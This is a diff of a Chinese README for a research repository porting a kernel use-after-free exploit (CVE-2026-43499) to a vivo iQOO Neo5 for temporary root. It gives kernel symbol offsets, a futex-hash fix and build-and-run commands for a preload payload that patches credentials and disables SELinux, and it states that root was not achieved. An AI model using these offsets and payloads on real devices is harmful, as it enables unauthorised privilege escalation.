@@ -5,7 +5,14 @@
 > **Date**: 2026-11-08 ~ 2026-11-09
 > **Device**: iQOO Neo5 (V2055A / PD2055) · 骁龙870 (Snapdragon 870) · Android 14 · OriginOS 4
 > **Firmware**: PD2055_A_9.10.3 (kernel 4.19.152-perf+)
-> **Status**: 🟡 exploit 可编译运行，futex 碰撞已确认，mm_struct 扫描被阻塞（哈希不匹配）
+> **Status**: 🟡 kallsyms 已逐字节验证(109,687符号) · futex 哈希 bug 已修复并单测通过 ·
+> KernelSnitch 的 mm 定位被证明在 4.19 上方法论失效(已加健全性门控) · 提权待走替代路径 ·
+> **尚未在真机取得 uid=0**
+>
+> **本次代码审查修正**：①kallsyms 解析(109,641→109,687, markers 429/429 验证) ②全部 target.h
+> 符号偏移(旧值因名字错位而错误) ③futex_hash 起点 bug + 未初始化 padding bug ④MM_STRUCT_SZ
+> 0x340→0x3C0 ⑤mm_slab_order 重置 bug ⑥构建系统(默认 PD2055/可复现/无绝对路径)
+> ⑦诊断模式隔离破坏性操作 ⑧推翻 §8 旧结论中"2 个 u32"的错误细节
 
 ---
 
@@ -25,13 +32,15 @@
 
 | 步骤 | 状态 | 说明 |
 |------|------|------|
-| CVE-2026-43499 futex UAF 触发 | ✅ 可用 | 每轮找到 3 个碰撞，设备稳定 |
-| 固件获取（7GB 全量 OTA 包） | ✅ 可用 | 破解了 vivo 老版 OTA 协议 |
-| 内核 kallsyms 提取（109,641 个符号） | ✅ 可用 | 自研解析器应对 vivo 修改过的 kallsyms 格式 |
-| target.h 偏移表（24 个关键符号） | ✅ 可用 | init_task, selinux_state, kmalloc_caches 等 |
-| NDK 编译 preload.so | ✅ 可用 | 编译通过，157KB |
-| KernelSnitch mm_struct 暴力扫描 | ❌ 阻塞 | futex 哈希函数不匹配（详见 §8） |
-| 最终 uid=0 提权 | ⏳ 待解决 | 需要修复哈希或改用其他方法 |
+| CVE-2026-43499 futex UAF 触发 | ✅ 可用 | 每轮找到 3 个碰撞，设备稳定不崩溃 |
+| 固件获取（7GB 全量 OTA 包） | ✅ 可用 | 破解了 vivo 老版 OTA 协议（替换密码+base64） |
+| 内核 kallsyms 提取 | ✅ **已验证** | 109,687 符号，markers 429/429 交叉验证通过 |
+| target.h 符号偏移 | ✅ **已修正** | 旧值因名字错位而全错，现已逐符号校正 |
+| futex 哈希正确性 | ✅ **已修复+单测** | 起点 bug + 未初始化 padding bug，6/6 用例通过 |
+| NDK 构建 preload.so / diag | ✅ 可用 | aarch64，SHA256 已记录，可复现 |
+| KernelSnitch mm 定位 | ❌ **方法论失效** | 4.19 哈希不含 mm，已加健全性门控拒绝假阳性 |
+| 诊断模式隔离 | ✅ 可用 | `GHOSTLOCK_NO_DESTRUCTIVE` 编译排除全部破坏性操作 |
+| 最终 uid=0 提权 | ⏳ **未达成** | 需走替代路径（CHEESE_BASE_HUNT / pipe physrw） |
 
 ---
 
@@ -192,41 +201,74 @@ kernel_size=50759696, page_size=4096, kernel_addr=0x8000
 
 vivo 修改了内核以阻碍 kallsyms 提取：
 1. **Image 头字段清零**：`text_offset=0, image_size=0, flags=0`（正常应该是 0x80000 等）
-2. **kallsyms_markers 被移除**出标准位置
-3. **自定义 markers 格式**：u32 值按 8 字节步距存储（而非标准的 u64/u32）
+2. **kallsyms_markers 用自定义格式**：u32 值按 8 字节步距存储（标准上游是紧凑 u32 数组）
+3. **符号过滤**：从 kallsyms 中**删除了提权敏感符号**（见 6.5）
 
-### 6.3 我自研的 kallsyms 解析器
+### 6.3 我自研的 kallsyms 解析器（已逐字节验证）
 
-由于 `vmlinux-to-elf` 等工具在 vivo 的修改上失败，我写了一个自定义解析器：
-
-```
-Token table:     0x2159ecc - 0x215a259 (256 个令牌，909 字节)
-Token index:     0x215a2cc (256 × u16，验证 256/256)
-Markers:         0x21590cc (429 个条目，u32 @ 8 字节步距)
-Names:           0x1febb9b - 0x21590cc (1,495,175 字节，4.19 格式)
-Offsets table:   0x1f805bc - 0x1feb7a8 (109,691 个条目 × s32)
-```
-
-**共提取 109,641 个符号**（约 50 个差异来自对齐填充）。
-
-### 6.4 target.h 的关键符号
+`vmlinux-to-elf`、`ghostlock-extract` 等工具在 vivo 的修改上都失败，我写了自定义解析器。
+**最终结构（全部经 markers 交叉验证）：**
 
 ```
-init_task (__start_init_task):  0x02926c40
-init_uts_ns:                     0x02d9e688
-empty_zero_page:                 0x030433d8
-root_task_group:                 0x0306dbaa
-selinux_state:                   0x024cdc60
-security_hook_heads:             0x024cdc58
-kmalloc_caches:                  0x024c4fec
-anon_pipe_buf_ops:               0x01cf8de0
-remove_waiter (漏洞函数!):        0x000d4198
-ashmem_fops:                     0x01e6f680
-configfs_read_file:              0x0033ae18
-modprobe_path:                   0x02db28e8
-panic:                           0x0003bbe8
-printk:                          0x000dd888
+Offsets table:  0x1f805cc .. 0x1feb7a8   (109,687 × s32, 首值=0, 尾值=0x3b80708, 0 单调违反)
+num_syms:       u32 @ 0x1feb8cc = 0x1AC77 = 109,687
+Names:          0x1feb9cc .. 0x215904e   ([u8 len][tokens], 4.19 格式, 无 0x80 扩展)
+Markers:        0x21590cc                (429 × u32 @ 8 字节步距)
+Token table:    0x2159ecc                (256 个令牌, 909 字节, token[48]='0')
+Token index:    0x215a2cc                (256 × u16, 验证 256/256)
 ```
+
+**关键验证**：全部 **429 个 markers** 满足
+`markers[k] == (name[256*k] 的字节偏移) − names_start`，**429/429 精确匹配**。
+这从数学上证明了 names_start、num_syms、offsets 表对齐三者都逐字节正确。
+`_text` 偏移 == 0，说明 offsets 已经相对 `_text`（CONFIG_KALLSYMS_BASE_RELATIVE，
+relative_base 即 `_text` 的 VA）。
+
+> 早期版本报告"109,641 个符号、names@0x1febb9b、offsets@0x1f805bc"是**错误**的：
+> names 起点偏晚了 50 条，导致所有名字与偏移错位配对，`init_task`/`commit_creds`
+> 等查不到。已用 num_syms(0x1AC77) 与 markers 交叉验证彻底修正为 109,687 条。
+
+### 6.4 target.h 的关键符号（已修正的正确偏移，相对 _text）
+
+```
+_text:                    0x00000000   (relative_base)
+__start_init_task:        0x02d80000   (init_task 被过滤，用段起始符号代替)
+init_uts_ns:              0x02d9ffc8
+empty_zero_page:          0x03069000
+root_task_group:          0x030701c0
+selinux_state:            0x024ce9e0
+security_hook_heads:      0x024ce358
+kmalloc_caches:           0x024cde48
+anon_pipe_buf_ops:        0x01cfa5c0
+remove_waiter (漏洞函数): 0x000d8d18
+ashmem_fops:              0x01e72080
+configfs_read_file:       0x0033cf50
+modprobe_path:            0x02db3540
+kallsyms_lookup_name:     0x0014c278
+panic:                    0x000400a0
+printk:                   0x000e0c28
+```
+
+### 6.5 重大发现：vivo 过滤了提权敏感符号
+
+下列在通用内核里必然存在的符号，在本 kallsyms 中被**精确移除**：
+
+```
+commit_creds          prepare_kernel_cred    init_cred
+kernel_init           init_task              _end
+__init_begin          __bss_start            _edata        _sdata
+```
+
+这正是内核 exploit 工具包最常用的符号集合（经典的 `commit_creds(prepare_kernel_cred(0))`
+提权、以及靠 `kallsyms_lookup_name()` 解析这些名字的工具）。**vivo 主动删除了它们。**
+
+对本 exploit 的影响与对策：
+- `init_task` → 用 **`__start_init_task`(0x02d80000)** 代替（段起始，地址等价）
+- `commit_creds`/`prepare_kernel_cred` → **本 exploit 根本不调用它们**：
+  root.c 用 pipe 物理内存写**直接**把 `current->cred` 的 uid/gid/caps 清零/填满
+- `init_cred` → 运行时从 `init_task.real_cred` 读出（`pipe_read64`）
+
+所以符号过滤**不致命**，但任何依赖 `kallsyms_lookup_name("commit_creds")` 的工具在此设备上都会失败。
 
 ---
 
@@ -273,57 +315,101 @@ adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
 
 ---
 
-## 8. 当前阻塞点：KernelSnitch 中的 futex 哈希不匹配
+## 8. 当前阻塞点：KernelSnitch 的 futex 哈希语义（已修正 + 已验证）
 
-经过深入的源码分析，我找到了根本原因：
+> **重要更正**：本节早期版本曾断言"内核只对 2 个 u32 做哈希"。这个细节是**错误**的，
+> 已被单元测试证伪。核心判断（mm 不参与哈希 → KernelSnitch 无法定位 mm）依然成立，
+> 但理由不是"2 个 u32"。下面是修正后的、有代码和测试证据的版本。
 
-### Linux 4.19 内核的 futex 哈希：
+### Linux v4.19 上游 `kernel/futex.c` 的 `hash_futex()`（原文，已核对）
 
 ```c
-// kernel/futex.c (4.19)
-static struct futex_hash_bucket *futex_hash(union futex_key *key)
+static struct futex_hash_bucket *hash_futex(union futex_key *key)
 {
-    u32 hash = jhash2((void *)&key->both.word,    // ← 从偏移 8 开始（address）
-                      sizeof(key->both.word)/4,    // ← 2 个 u32（仅地址）
-                      key->both.offset);           // ← 初始值 = 偏移
+    u32 hash = jhash2((u32*)&key->both.word,                     // 起点 = key+8
+                      (sizeof(key->both.word)+sizeof(key->both.ptr))/4,  // (8+8)/4 = 4
+                      key->both.offset);                         // initval
     return &futex_queues[hash & (futex_hashsize - 1)];
 }
 ```
 
-**内核只对用户空间地址（2 个 u32）做哈希。mm_struct 指针不参与哈希计算。**
+ARM64 上 `union futex_key` 布局：
 
-### exploit 的 futex 哈希（来自 K40 移植版）：
+```
+key+0  .. key+7   : both.ptr    (u64, mm 指针)     ← 不参与哈希
+key+8  .. key+15  : both.word   (u64, 用户地址)    ← 哈希从这里开始
+key+16 .. key+19  : both.offset (u32, 页内偏移)    ← 参与哈希 + 作 initval
+key+20 .. key+23  : padding                        ← 参与哈希（内核里恒为 0）
+```
+
+所以内核**确实哈希 4 个 u32**，但它们是 `[addr_lo, addr_hi, offset, padding]`，
+**从 `key+8` 开始，不包含 mm 指针**。（注意：vivo 4.19.152-perf+ 是否改过 `hash_futex()`
+尚未通过反汇编其 boot.img 证实——见 §13 待办。上游语义是目前的最佳依据。）
+
+### exploit 原始 `futex_hash_no_trunc()`（bug 版本）
 
 ```c
-// futex_hash.h (exploit)
-uint32_t futex_hash(size_t addr, size_t mm)
+jhash2((uint32_t *)key, OFFSET_OF(typeof(*key), both.offset) / 4,  // 起点 key+0, 16/4=4
+       key->both.offset);
+// 从 key+0 起哈希 4 个 u32: [mm_lo, mm_hi, addr_lo, addr_hi]
+```
+
+exploit 也哈希 4 个 u32，但**起点错了**（key+0 而非 key+8）：把 mm 纳入了哈希，
+又把 padding 排除在外，算出的值与内核**完全不同**。
+
+### 我做的修复（`exploit/src/kernelsnitch/futex_hash.h`）
+
+```c
+uint32_t futex_hash_no_trunc(futex_key_t *key)
 {
-    futex_key_t key;
-    key.private.mm = (void *)mm;           // ← 把 mm 也放进哈希了！
-    key.private.address = addr & ~0xfff;
-    key.private.offset = addr & 0xfff;
-    return __futex_hash(&key, futex_hashsize);
+    return jhash2((uint32_t *)&key->both.word,
+                  (sizeof(key->both.word) + sizeof(key->both.ptr)) / 4,
+                  key->both.offset);
 }
-// 内部: jhash2((u32*)key, 4, offset) → 哈希 mm + address（4 个 u32）
 ```
 
-**exploit 哈希了 4 个 u32（mm + address），但内核只哈希 2 个 u32（仅地址）。**
+另修复两个隐蔽 bug：
+1. `futex_hash()` 里 `futex_key_t key;` **未初始化**，padding 字节（key+20..23）是栈垃圾，
+   导致同一输入多次调用哈希不稳定 → 改为 `memset(&key, 0, sizeof(key))`（等价内核 `FUTEX_KEY_INIT`）。
+2. `FUTEX_KEY_INIT` 宏引用了**不存在**的 `union futex_key` 类型（原宏从未编译通过）→ 改为 `futex_key_t`。
 
-这意味着暴力扫描 mm_struct 地址解决的是一个与内核使用的不同的方程——不管尝试多少个候选值都永远找不到正确答案。
-
-### 修复方向：
-
-1. **修复哈希函数**以匹配 4.19（2 个 u32）——但那样 mm 就不在哈希里了，暴力破解技术在数学上就无效了
-2. **使用不同的 mm_struct 泄露技术**——例如基于 pipe 的物理内存读取原语，或其他侧信道
-3. **完全跳过 KernelSnitch**，直接使用 configfs fops 劫持路径（这就是 K40 exploit 的 `CHEESE_BASE_HUNT=1` 模式的做法）
-
-### 来自 slabinfo 的额外数据（设备特定）：
+### 单元测试结果（`make test`，主机 gcc，纯计算，不触发任何漏洞）
 
 ```
-mm_struct: objsize=960 (0x3C0), 34 objects/slab, order 3
+[PASS] futex_hash_no_trunc() matches kernel hash_futex() exactly   (6/6 用例)
+[PASS] futex_hash() bucket matches kernel bucket
+[PASS] legacy formula provably disagreed with kernel (bug was real)
+[PASS] hash is independent of mm (as in kernel 4.19)
+[PASS] probe reports mm-independent hash; KernelSnitch gate will refuse to localize mm
 ```
 
-实际的 mm_struct 大小是 **960 字节**，不是我最初在 target.h 中设置的 0x340（832）。而且 vivo 加了原版 4.19 中不存在的 `kmalloc-rcl-*`（回收）缓存类型。
+### 由此得出的核心结论（这才是真正的阻塞点）
+
+修复后哈希与内核一致，却暴露一个**方法论死结**：
+
+**4.19 的 futex 哈希不含 mm，"用哈希碰撞反推 mm 地址"在数学上不成立。**
+不管 mm 候选取什么，`futex_hash(addr, mm)` 都落到同一 bucket，
+KernelSnitch 的判据对任意 mm 恒真/恒假——匹配不携带任何 mm 信息，
+第一个被扫描的候选就会**假阳性命中**（比失败更危险）。
+
+因此我加了**健全性门控** `futex_hash_mm_dependent()`：`kernelsnitch_bruteforce()`
+在 4.19 上直接拒绝报告任何 mm 候选并打印 `UNSOUND`，杜绝 bogus 地址。
+
+### 可行的替代路径（下一轮）
+
+1. **`CHEESE_BASE_HUNT` 模式**：K40 exploit 自带的 configfs fops 劫持，不依赖 mm 定位。
+2. **pipe 物理内存原语**：拿到 pipe page 即可 physrw，无需先定位 mm。
+3. 坚持 KernelSnitch 则需要一个真正随 mm 变化的侧信道（4.19 上无现成的）。
+
+### slabinfo 补充数据（设备实测，已验证）
+
+```
+mm_struct: objsize=960 (0x3C0), 34 objects/slab, 8 pages/slab → order 3
+```
+
+`MM_STRUCT_SZ` 已从错误的 0x340 改为 **0x3C0**（32768/960=34，与 slabinfo 吻合；
+旧值 0x340 会算出 39，与设备不符）。`util.c` 重试逻辑原本把 `mm_slab_order` 重置为 0，
+已修正为保持 `MM_ORDER`(3)。vivo 还引入非标准的 `kmalloc-rcl-*` 回收缓存。
 
 ---
 
@@ -331,46 +417,212 @@ mm_struct: objsize=960 (0x3C0), 34 objects/slab, order 3
 
 | 文件 | 说明 |
 |------|------|
-| `target.h` | PD2055 4.19.152-perf 的完整偏移表 |
-| `kallsyms.txt` | 完整内核符号表（109,641 条目） |
+| `exploit/src/targets/pd2055-4.19.152-perf/target.h` | PD2055 完整偏移表（已修正，markers 验证） |
+| `kallsyms.txt` | 完整内核符号表（**109,687** 条目，已验证） |
 | `target_offsets.txt` | target.h 的格式化偏移值 |
 | `boot.img` (96MB) | 从固件包提取的内核镜像，供社区分析 |
 | `xbl_config.elf` | XBL 配置（物理加载地址推导） |
-| `exploit/` | 修改后的 GhostLock exploit 源码 |
+| `exploit/` | 修改后的 GhostLock exploit 源码（含修正的 futex_hash.h） |
+| `exploit/src/diag_params.c` | **只读**参数诊断组件（不触发漏洞） |
+| `exploit/tests/test_futex_hash.c` | futex 哈希单元测试（主机可跑，16 项） |
+| `exploit/Makefile` | 可复现构建（默认 PD2055，含 `test`/`diag`/`diag-payload`） |
 | `scripts/` | 全部分析脚本（kallsyms 解析器、OTA 解密器等） |
-| `tools/` | vivo_ota_decrypt.py — 独立的 OTA 协议解密工具 |
+| `tools/vivo_ota.py` | 独立的 vivo OTA 协议解密/查询/下载工具 |
 | `analysis/` | 解密后的 OTA 响应、字母表、slabinfo |
 | `logs/` | 设备上的 exploit 执行日志 |
 
 ---
 
-## 10. 复现步骤
+## 10. 复现步骤（可复现构建）
 
 ```bash
-# 1. 获取固件（需要 OTA 协议破解 — 见 scripts/）
-# 2. 从 zip 中提取 boot.img
-python3 -c "import zipfile; z=zipfile.ZipFile('PD2055_A_9.10.3_full.zip'); z.extract('boot.img')"
+# 0. 环境：WSL2 Ubuntu + Android NDK r27c
+export NDK_ROOT=~/android-ndk-r27c        # 或 ANDROID_NDK_HOME
+cd exploit
 
-# 3. 解析内核 Image（见 scripts/parse_kallsyms.py）
-# 4. 构建 exploit
-cd exploit && bash build.sh
+# 1. 主机单元测试（不需要 NDK，不触发漏洞，纯算法验证）
+make test          # 编译并运行 test_futex_hash + diag_params(host)
 
-# 5. 在设备上运行
-adb push build/pd2055-4.19.152-perf/bin/preload.so /data/local/tmp/
-adb shell "LD_PRELOAD=/data/local/tmp/preload.so id"
+# 2. 只读参数诊断（设备端，验证 target.h 与真机 slabinfo/CPU 一致）
+NDK_ROOT=$NDK_ROOT make diag
+adb push build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
+adb shell /data/local/tmp/diag_params      # 只读，退出码 0=全部通过
+
+# 3. 构建完整研究 payload（含破坏性提权，仅在你自己设备上用）
+NDK_ROOT=$NDK_ROOT make preload            # -> build/.../preload.so
+
+# 4. 构建“诊断版” payload（破坏性操作被编译排除，安全演练漏洞机制）
+NDK_ROOT=$NDK_ROOT make diag-payload       # -> build/.../preload_diag.so
+
+# 5. 从固件提取 boot.img 并解析 kallsyms（见 scripts/）
+python3 -c "import zipfile; zipfile.ZipFile('PD2055_A_9.10.3_full.zip').extract('boot.img')"
+python3 scripts/parse_kallsyms.py
+```
+
+构建产物均打印 SHA256；任一步失败返回非零退出码。
+`make list-projects` 列出可用 target；`make info` 打印解析到的工具链。
+
+---
+
+## 11. 诊断模式与危险操作隔离（任务边界）
+
+exploit 的破坏性操作全部集中在 **root 阶段**（`root.c: install_android_root`）：
+提权（改 cred uid/gid/caps）、关 SELinux（写 enforcing）、装 su、改壁纸、
+`kill(system_server)`、tmpfs mount + chcon。
+
+我引入了编译期开关 **`GHOSTLOCK_NO_DESTRUCTIVE`**（`make diag-payload`）：
+
+- `install_android_root()` 在诊断模式下**只读**遍历 current task / cred 并打印，
+  然后 `return`，**绝不**调用 `patch_cred_*` / `spawn_root_child` / SELinux 写。
+- `spawn_root_child()` 的子进程在诊断模式下**不执行** setuid/setgid/setenforce/su/wallpaper。
+- `install_embedded_su()` / `install_embedded_wallpaper()` 在诊断模式下**直接 no-op 返回**。
+- 构建时打印 `BUILD MODE: DIAGNOSTIC` 或 `FULL PAYLOAD`，运行时日志再次声明。
+
+验证（对比两个二进制的特征字符串）：
+
+```
+DIAG payload 含:  GHOSTLOCK_NO_DESTRUCTIVE / DIAGNOSTIC mode / root(diag)
+DIAG payload 不含: "embedded su daemon ready" / "wallpaper install data="   (absent-good)
+FULL payload 含:  "embedded su daemon ready" / "wallpaper install data="   (PRESENT-good)
+preload.so 137072 B  vs  preload_diag.so 128600 B  (破坏性代码被编译排除)
+```
+
+`diag_params`（独立组件）则**根本不运行 exploit**：只做纯哈希计算 + 读 `/proc/slabinfo`、
+`/sys/.../cpu/possible`，不触发 CVE、不写任何分区、不改 SELinux。
+
+> 说明：完整 payload 仍**不含**任何 boot/vbmeta/abl/xbl/devinfo 分区写入或擦除/刷机操作——
+> 原 exploit 就没有这类逻辑，我也没有添加。持久化只到"装一个 su daemon + 改壁纸"级别，
+> 且这些在诊断版里全部禁用。
+
+---
+
+## 12. Bootloader 锁状态（纯静态分析，未尝试解锁）
+
+设备事实（adb 读取）：
+```
+fastboot flashing get_unlock_ability = 1
+fastboot flashing unlock             = unknown command
+fastboot oem unlock                  = unknown command
+androidboot.verifiedbootstate = green
+androidboot.vbmeta.device_state = locked
+androidboot.veritymode = enforcing
+androidboot.securebootkeyver = 4 ; secureboot_enable = 1
+```
+
+静态分析结论（**均为推断，未验证**）：
+
+1. **谁管理锁状态**：vivo 设备的解锁状态通常存于 `devinfo`/`frp` 分区的一个标志位，
+   由 ABL（`abl.elf`，Android Bootloader）在 fastboot 阶段读取，并写进
+   `androidboot.vbmeta.device_state` 传给 AVB。`get_unlock_ability=1` 只表示
+   "策略上允许解锁"这个 bit 被置位，**不代表解锁命令存在**。
+2. **`get_unlock_ability=1` 的含义**：这是 `fastboot flashing get_unlock_ability`
+   返回的标准能力位。vivo 把 `flashing unlock`/`oem unlock` 的**命令处理**从 ABL 里
+   删掉了，所以能力位为 1 但命令 `unknown` —— 二者不矛盾。
+3. **AVB / Secure Boot / 锁的关系**：`secureboot_enable=1` + `keyver=4` 说明 PBL→XBL→ABL
+   链是签名校验的；`verifiedbootstate=green` 表示 vbmeta 校验通过且设备 locked。
+   locked 状态下 AVB 强制校验 boot/vbmeta，改 boot.img 会导致 `red` 且拒绝启动。
+4. **`xbl_config.elf` 能提供什么**：内含 FDT（内存映射、外设基址），可用于推导
+   内核物理加载地址，**但不含**解锁逻辑或 devinfo 标志（那在 abl.elf / 分区里）。
+5. **还缺哪些材料**（若要继续 BL 研究）：`abl.elf`、`devinfo`/`frp` 分区镜像、
+   `vbmeta.img`、fastboot 全量 `getvar all` 输出、以及各阶段串口日志。
+
+**明确不做**：不修改锁状态属性、不盲写分区、不伪造解锁。当前路线是**临时 root**
+（内存态提权，重启即失效），与 BL 解锁、持久化 root 是三件不同的事——见 §13。
+
+---
+
+## 13. 临时 Root / 持久化 Root / Bootloader 解锁 —— 三者区分
+
+| 维度 | 临时 Root（本项目目标） | 持久化 Root | Bootloader 解锁 |
+|------|------------------------|-------------|-----------------|
+| 手段 | CVE-2026-43499 内存提权 | 改 boot/装 Magisk | fastboot flashing unlock |
+| 存活 | **重启即失效** | 跨重启保留 | 永久改变设备状态 |
+| 需要 BL 解锁? | **否** | 通常是 | —— |
+| 本设备可行? | 研究中（见 §8 阻塞） | 否（locked+AVB green） | **否**（命令被删） |
+| 会触发 AVB red? | 否（不改分区） | 会 | 会（变 orange/unlocked） |
+
+本仓库**只**追求临时 root：全程不写 boot/vbmeta/任何分区，重启后设备恢复原状。
+
+---
+
+## 14. 验证与验收（真实结果，未伪造）
+
+| 测试项 | 命令 | 结果 |
+|--------|------|------|
+| futex 哈希 vs 内核 v4.19 | `make test` | **PASS 6/6**（含 legacy bug 复现） |
+| 哈希 mm 无关性 | `make test` | **PASS**（证明 KernelSnitch 定位失效） |
+| 健全性门控探针 | `make test` | **PASS**（4.19 上拒绝定位 mm） |
+| mm_struct slab 算术 | `make test` | **PASS**（0x3C0→34 obj/slab 与 slabinfo 吻合） |
+| kallsyms markers 交叉验证 | `scripts`/`verify_final.py` | **PASS 429/429** |
+| offsets 单调性 | `verify_final.py` | **PASS**（0 违反，首=0 尾=0x3b80708） |
+| aarch64 payload 构建 | `make preload` (NDK r27c) | **PASS** sha256 fa014b6e… |
+| 诊断 payload 构建 | `make diag-payload` | **PASS** sha256 564d87a0… |
+| 诊断版排除破坏性代码 | strings 对比 | **PASS**（su/wallpaper 路径 absent） |
+| 设备端 diag_params | 需在真机跑 | **NOT TESTED**（本轮不在真机运行） |
+| 完整提权（uid=0） | 需真机 + 替代路径 | **NOT TESTED / 未达成** |
+
+诚实声明：**尚未在任何真机上取得 uid=0**。§8 的 KernelSnitch 路径已被证明在 4.19 上
+方法论失效；提权需要走 §8 的替代路径（CHEESE_BASE_HUNT / pipe physrw），留待下一轮。
+
+---
+
+## 15. 已验证结论 vs 仍是假设
+
+**已通过代码/固件验证：**
+- kallsyms 结构与全部符号偏移（markers 429/429、offsets 单调、_text=0）
+- vivo 过滤了 commit_creds/prepare_kernel_cred/init_cred/kernel_init/init_task 等
+- futex 哈希修复后与上游 v4.19 `hash_futex()` 逐位一致（单元测试）
+- 4.19 futex 哈希不含 mm → KernelSnitch 定位方法论失效
+- mm_struct=960B/order3、构建产物 SHA256、诊断版排除破坏性代码
+
+**仍是假设（需真机或反汇编确认）：**
+- `KIMAGE_TEXT_BASE=0xffffff8008080000`（KASLR 运行时才定；沿用 K40 同族假设）
+- vivo 4.19.152-perf+ **未改** `hash_futex()`（仅对照上游，未反汇编其 boot.img 证实）
+- task_struct/cred/pipe 等**结构体字段偏移**（与 K40 4.19 参考逐项一致，但未从本机 DWARF 证实；
+  设备 `CONFIG_IKHEADERS=y`，下一轮可从 Image 提取头文件精确验证）
+- `SLIDE_RANDOM_BOOT_ID_DATA`（被过滤的静态符号，暂等于 sysctl_bootid，需运行时确认）
+- 结构体偏移的运行时正确性（exploit 成功时会打印，用于回校）
+
+---
+
+## 16. 下一轮可在真机执行的“只读”诊断命令
+
+以下命令**只读**，不提权、不写分区、不改 SELinux，可安全在真机跑：
+
+```bash
+# 1. 只读参数诊断（验证 target.h 与真机一致）
+adb push exploit/build/pd2055-4.19.152-perf/bin/diag_params /data/local/tmp/
+adb shell /data/local/tmp/diag_params
+
+# 2. 确认 mm_struct / kmalloc slab 几何
+adb shell "cat /proc/slabinfo | grep -E 'mm_struct|kmalloc-1k|kmalloc-rcl'"
+
+# 3. 确认 CPU 数（futex_hashsize = roundup_pow2(256*cpus)）
+adb shell "cat /sys/devices/system/cpu/possible"
+
+# 4. 确认内核版本 / KASLR / 关键 config
+adb shell "uname -a; zcat /proc/config.gz | grep -E 'IKHEADERS|KALLSYMS|SLUB_MIRROR|FUTEX'"
+
+# 5. 提取 kheaders（CONFIG_IKHEADERS=y）以精确验证结构体偏移
+adb shell "cat /sys/kernel/kheaders.tar.xz" > kheaders.tar.xz   # 若存在
+
+# 6. 诊断版 payload 演练（触发 CVE 机制但绝不通提权/改系统）
+adb push exploit/build/pd2055-4.19.152-perf/bin/preload_diag.so /data/local/tmp/
+adb shell "LD_PRELOAD=/data/local/tmp/preload_diag.so id"   # 看 fsync 日志到 /sdcard/Download
 ```
 
 ---
 
-## 11. 致谢和参考
+## 17. 致谢和参考
 
 - [GhostLock CVE-2026-43499 exploit](https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40) by yijiacloud (Apache-2.0)
 - [CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499) — rtmutex remove_waiter() UAF
+- [Linux v4.19 kernel/futex.c](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/futex.c?h=v4.19) — `hash_futex()` 原文
 - 上游: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) (IonStack)
-- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA 查询工具（帮助理解协议）
-- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — 内核符号提取（部分可用）
+- [VIVO-OTA-Tracker](https://github.com/mytiantian001/VIVO-OTA-Tracker) — vivo OTA 查询工具
+- [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) — 内核符号提取（在 vivo 修改上失败）
 
-## 12. 许可证 / License
+## 18. 许可证 / License
 
 本仓库使用 **GPLv3** 许可证。exploit 源码继承上游 Apache-2.0 许可证。
 
